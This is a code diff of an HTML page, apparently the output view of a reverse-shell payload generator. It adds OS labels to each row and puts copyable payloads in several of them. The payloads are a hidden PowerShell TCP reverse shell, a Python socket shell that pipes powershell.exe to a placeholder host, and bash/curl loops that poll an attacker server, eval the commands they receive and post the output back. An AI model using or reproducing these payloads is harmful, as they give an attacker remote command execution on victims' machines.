@@ -85,6 +85,9 @@
             
             <div class="results-container">
             <div class="row-container">
+                <div class="os-type">
+                    <span class="type-text">UNIX</span>
+                </div>
                 <div class="type-item">
                 <span class="type-text">TCP</span>
                 </div>
@@ -96,6 +99,9 @@
                 </div>
             </div>
             <div class="row-container">
+                <div class="os-type">
+                    <span class="type-text">UNIX</span>
+                </div>
                 <div class="type-item">
                     <span class="type-text">TCP</span>
                 </div>
@@ -107,6 +113,9 @@
                 </div>
             </div>
             <div class="row-container">
+                <div class="os-type">
+                    <span class="type-text">UNIX</span>
+                </div>
                 <div class="type-item">
                     <span class="type-text">TCP</span>
                 </div>
@@ -118,6 +127,9 @@
                 </div>
             </div>
             <div class="row-container">
+                <div class="os-type">
+                    <span class="type-text">UNIX</span>
+                </div>
                 <div class="type-item">
                     <span class="type-text">TCP</span>
                 </div>
@@ -129,6 +141,9 @@
                 </div>
             </div>
             <div class="row-container">
+                <div class="os-type">
+                    <span class="type-text">UNIX</span>
+                </div>
                 <div class="type-item">
                     <span class="type-text">TCP</span>
                 </div>
@@ -140,6 +155,9 @@
                 </div>
             </div>
             <div class="row-container">
+                <div class="os-type">
+                    <span class="type-text">UNIX</span>
+                </div>
                 <div class="type-item">
                     <span class="type-text">TCP</span>
                 </div>
@@ -151,6 +169,9 @@
                 </div>
             </div>
             <div class="row-container">
+                <div class="os-type">
+                    <span class="type-text">UNIX</span>
+                </div>
                 <div class="type-item">
                     <span class="type-text">TCP</span>
                 </div>
@@ -162,6 +183,9 @@
                 </div>
             </div>
             <div class="row-container">
+                <div class="os-type">
+                    <span class="type-text">UNIX</span>
+                </div>
                 <div class="type-item">
                     <span class="type-text">TCP</span>
                 </div>
@@ -173,27 +197,63 @@
                 </div>
             </div>
             <div class="row-container">
+                <div class="os-type">
+                    <span class="type-text">Win</span>
+                </div>
                 <div class="type-item">
-                    <span class="type-text">HTTP</span>
+                    <span class="type-text">TCP</span>
                 </div>
                 <div class="result-item">
-                    <span id="payload_text_8" class="payload_text result-text">nohup bash -c 's={host_name}&&i={session_id}&&hname=$(hostname)&&p=http://;curl -s "$p$s/$i/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/$i" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/$i -X POST -H "Authorization: $i" -d "c=$c&r=$r";echo $$;fi; fi; sleep 1; done;\' & disown</span>
+                    <span id="payload_text_8" class="payload_text result-text">Start-Process $PSHOME\powershell.exe -ArgumentList {$TCPClient = New-Object Net.Sockets.TCPClient('{host_name}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()} -WindowStyle Hidden</span>
                     <div class="copy-button">
                     <img id="copy_img" data-target="payload_text_8" src="/img/copy_32.png" alt="Copy">
-                    </div>
+                </div>
                 </div>
             </div>
             <div class="row-container">
+                <div class="os-type">
+                    <span class="type-text">Win</span>
+                </div>
                 <div class="type-item">
-                    <span class="type-text">HTTPS</span>
+                    <span class="type-text">TCP</span>
                 </div>
                 <div class="result-item">
-                    <span id="payload_text_9" class="payload_text result-text">nohup `s={host_name}&&i={session_id}&&hname=$(hostname)&&p=https://;curl -s -k "$p$s/$i/$hname/$USER" -H "Authorization: $i" -o /dev/null 2>/dev/null;while :; do c=$(curl -s -k "$p$s/$i" -H "Authorization: $i" 2>/dev/null);if [ "$c" != None ]; then r=$(eval "$c")&&if [ $r == byee ]; then pkill -P $$; else curl -s -k $p$s/$i -X POST -H "Authorization: $i" -d "c=$c&r=$r" 2>/dev/null; fi; fi; sleep 1; done;` &</span>
+                    <span id="payload_text_9" class="payload_text result-text">python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['powershell.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('{host_name}',{port}));threading.Thread(target=exec,args=('while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)',globals()),daemon=True).start();threading.Thread(target=exec,args=('while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)',globals())).start()"</span>
                     <div class="copy-button">
                     <img id="copy_img" data-target="payload_text_9" src="/img/copy_32.png" alt="Copy">
                 </div>
                 </div>
             </div>
+            <div class="row-container">
+                <div class="os-type">
+                    <span class="type-text">*</span>
+                </div>
+                <div class="type-item">
+                    <span class="type-text">HTTP</span>
+                </div>
+                <div class="result-item">
+                    <span id="payload_text_10" class="payload_text result-text">nohup bash -c 's={host_name}&&i={session_id}&&hname=$(hostname)&&p=http://;curl -s "$p$s/$i/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/$i" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/$i -X POST -H "Authorization: $i" -d "c=$c&r=$r";echo $$;fi; fi; sleep 1; done;\' & disown</span>
+                    <div class="copy-button">
+                    <img id="copy_img" data-target="payload_text_10" src="/img/copy_32.png" alt="Copy">
+                    </div>
+                </div>
+            </div>
+            <div class="row-container">
+                <div class="os-type">
+                    <span class="type-text">*</span>
+                </div>
+                <div class="type-item">
+                    <span class="type-text">HTTPS</span>
+                </div>
+                <div class="result-item">
+                    <span id="payload_text_11" class="payload_text result-text">nohup `s={host_name}&&i={session_id}&&hname=$(hostname)&&p=https://;curl -s -k "$p$s/$i/$hname/$USER" -H "Authorization: $i" -o /dev/null 2>/dev/null;while :; do c=$(curl -s -k "$p$s/$i" -H "Authorization: $i" 2>/dev/null);if [ "$c" != None ]; then r=$(eval "$c")&&if [ $r == byee ]; then pkill -P $$; else curl -s -k $p$s/$i -X POST -H "Authorization: $i" -d "c=$c&r=$r" 2>/dev/null; fi; fi; sleep 1; done;` &</span>
+                    <div class="copy-button">
+                    <img id="copy_img" data-target="payload_text_11" src="/img/copy_32.png" alt="Copy">
+                </div>
+                </div>
+            </div>
+
+
             </div>
     </div>
     <!-- Create Modal -->
